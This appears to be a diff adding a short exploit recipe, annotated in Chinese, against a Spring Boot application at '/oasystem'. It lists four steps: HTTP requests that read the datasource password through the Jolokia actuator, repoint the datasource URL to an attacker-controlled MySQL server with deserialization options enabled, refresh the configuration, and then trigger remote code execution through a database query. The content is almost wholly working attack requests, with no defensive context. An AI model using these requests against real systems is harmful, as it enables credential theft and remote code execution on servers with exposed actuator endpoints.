@@ -1,0 +1,35 @@
+1. 获取*加密的密码
+
+POST /oasystem/actuator/jolokia HTTP/1.1
+Content-Type: application/json
+Host: localhost:8000
+Connection: close
+Content-Length: 205
+
+{
+    "mbean": "org.springframework.boot:name=SpringApplication,type=Admin",
+    "operation": "getProperty",
+    "type": "EXEC",
+    "arguments": [
+        "spring.datasource.password"
+    ]
+}
+
+2. 修改配置，指向恶意MySQL服务器
+
+POST /oasystem/actuator/env HTTP/1.1
+Content-Type: application/json
+Host: localhost:8000
+Content-Length: 215
+
+{"name":"spring.datasource.url","value":"jdbc:mysql://IP:PORT/mysql?characterEncoding=utf8&useSSL=false&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&autoDeserialize=true"}
+
+
+3. 刷新配置
+
+POST /oasystem/actuator/refresh HTTP/1.1
+Host: localhost:8000
+Content-Length: 0
+
+
+4. 用户操作，触发SQL查询，RCE。
